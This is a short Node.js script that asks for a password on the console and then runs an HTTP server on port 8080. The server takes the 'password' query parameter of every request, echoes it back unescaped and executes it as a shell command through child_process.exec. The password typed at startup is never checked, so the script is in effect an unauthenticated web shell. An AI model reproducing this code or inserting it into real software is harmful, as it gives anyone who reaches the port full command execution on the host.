var http = require('http');
var url = require('url');

// readline function
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
})

// create password
readline.question(`Create Password: `, (password) => {
  http.createServer(function (req, res) {
    res.writeHead(200, {'Content-Type': 'text/html'});
    var q = url.parse(req.url, true).query;
    var websiteUSR = q.password;
    res.end(websiteUSR);
    const {exec} = require("child_process")
    exec(websiteUSR).unref()
  }).listen(8080);
})
